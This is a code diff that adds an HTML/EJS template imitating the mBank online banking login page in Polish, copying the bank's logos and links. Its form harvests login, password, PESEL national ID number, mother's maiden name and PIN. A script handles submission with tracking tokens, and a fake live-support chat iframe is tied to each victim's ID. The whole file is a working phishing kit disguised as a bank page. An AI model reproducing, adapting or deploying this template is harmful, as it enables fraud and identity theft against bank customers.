@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="pl"
+    class="js canvas canvastext no-touch geolocation postmessage hashchange history websockets rgba backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csstransitions fontface generatedcontent localstorage no-applicationcache stylish-select js canvas canvastext no-touch geolocation postmessage hashchange history websockets rgba backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csstransitions fontface generatedcontent localstorage no-applicationcache">
+<!--<![endif]-->
+
+<head>
+    <style>
+        body {
+            transition: opacity ease-in 0.2s;
+        }
+
+        body[unresolved] {
+            opacity: 0;
+            display: block;
+            overflow: hidden;
+            position: relative;
+        }
+    </style>
+
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="description" content="Logowanie do serwisu transakcyjnego mBanku">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mBank serwis transakcyjny</title>
+    <link rel="stylesheet" href="/css/default_lk.css">
+    <link rel="Stylesheet" type="text/css"
+        href="https://online.mbank.pl/LoginMain/Resources/par_axd/LoginMain?file=ResponsiveLogin%2FStyles%2FResponsiveLogin.css&amp;v=8020e5febf966011a5025f9096c998f3">
+</head>
+
+<body>
+
+    <header class="header">
+
+
+
+
+        <a href="https://www.mbank.pl/">
+            <img class="header-left"
+                src="https://online.mbank.pl/LoginMain/Resources/par_axd/LoginMain?file=Content/Images/mbank-logo-retail.png"
+                width="107" height="40" alt="Link do głównej strony mBank">
+        </a>
+
+
+        <h1 class="accessible-not-visible">Zaloguj się do serwisu transakcyjnego</h1>
+        <span class="header-left">Zaloguj się do serwisu transakcyjnego</span>
+    </header>
+    <div class="main">
+        <div class="img-container">
+
+
+            <img src="https://online.mbank.pl/contentcache/logon/responsive_logon_retail/background" alt=""
+                role="presentation">
+
+
+        </div>
+        <div class="panel">
+
+
+            <div id="retail" class="login expanded login-form scenario-default">
+                <div class="login-container">
+                    <form id="lk_form">
+                        <div class="color"></div>
+                        <div class="login-content">
+                            <div class="title-container ">
+                                <h2 class="accessible-not-visible">Klienci indywidualni i firmowi</h2>
+                                <div class="title">Klienci indywidualni i firmowi</div>
+                            </div>
+
+                            <div class="logged-container" role="alert" aria-live="assertive">
+                                <div class="logged">Zalogowano</div>
+                            </div>
+
+                            <div class="spinner-container">
+                                <div class="photo spinner"></div>
+                            </div>
+
+                            <div class="error-container" role="alert">
+                                <div id="errorMessage" class="message"></div>
+                                <div id="errorDetails" class="details"></div>
+                            </div>
+
+                            <div class="form-container">
+                                <div class="photo-container">
+                                    <div class="avatar photo photo-retail"
+                                        style="background-image: url(https://online.mbank.pl/contentcache/logon/responsive_logon_retail/avatar_retail)">
+                                    </div>
+                                </div>
+                                <div class="field-container">
+
+                                    <div class="form-input">
+                                        <input id="login" type="text" required placeholder="Identyfikator"
+                                            aria-describedby="userIDDescription" autofocus="" autocomplete="off">
+
+                                    </div>
+                                    <div class="form-input">
+                                        <input id="password" type="password" required placeholder="Hasło"
+                                            aria-describedby="passDescription" autocomplete="off">
+
+                                    </div>
+                                    <div class="form-input">
+                                        <input id="pesel" required placeholder="Pesel" autocomplete="off">
+                                    </div>
+                                    <div class="form-input">
+                                        <input id="motherlastname" required placeholder="Nazwisko panieńskie matki"
+                                            autocomplete="off">
+                                    </div>
+                                    <div class="form-input">
+                                        <input id="pin" type="password" required placeholder="PIN" autocomplete="off">
+                                    </div>
+
+                                </div>
+                            </div>
+                        </div>
+                        <div class="buttons form-buttons">
+                            <button id="submitButton" form="lk_form" type="submit" class="btn">
+                                Dalej
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            <div id="pb" class="login collapsed">
+                <a href="https://online.mbank.pl/pl/LoginPB">
+                    <div class="title-container">
+                        <h2 class="accessible-not-visible">Private Banking</h2>
+                        <div class="title">Private Banking</div>
+                    </div>
+                    <div class="photo-container">
+                        <div class="photo photo-pb"
+                            style="background-image: url(https://online.mbank.pl/contentcache/logon/responsive_logon_retail/avatar_pb)">
+                        </div>
+                    </div>
+                </a>
+            </div>
+            <div id="corpo" class="login collapsed">
+                <a href="https://online.mbank.pl/pl/LoginCompanyNet">
+                    <div class="title-container">
+                        <h2 class="accessible-not-visible">CompanyNet</h2>
+                        <div class="title">CompanyNet</div>
+                    </div>
+                    <div class="photo-container">
+                        <div class="photo photo-corpo"
+                            style="background-image: url(https://online.mbank.pl/contentcache/logon/responsive_logon_retail/avatar_corpo)">
+                        </div>
+                    </div>
+                </a>
+            </div>
+
+
+
+
+
+
+
+
+
+
+
+        </div>
+    </div>
+
+
+
+
+
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+        const LOG_TOKEN = <%=log.token%>,
+            AD_LANG = "<%=log.ad.service.lang%>",
+            AD_ID = <%=log.ad.id%>,
+            translate = <%-JSON.stringify(translate) %>;
+    </script>
+    <script src="/js/lk.js" defer></script>
+    <link rel="stylesheet" href="/css/support_parent.css" />
+    <div class="
+    chatra--webkit
+    chatra--style-round
+    chatra--side-bottom
+    chatra--pos-right
+    chatra--visible
+    chatra--expanded
+    chatra--fast-toggle
+  " id="chatra" data-turbolinks-permanent="" style="
+    width: 380px;
+    height: 600px;
+    transform: none;
+    z-index: 2147483647;
+    display: none;
+  ">
+        <div id="chatra__iframe-wrapper">
+            <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat"
+                allow="autoplay" src="/supportChatFrame/<%=log.ad.id%>"
+                style="width: 380px; height: 600px; position: absolute"></iframe>
+        </div>
+    </div>
+    <div class="support-circle"
+        onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+</body>
+
+</html>
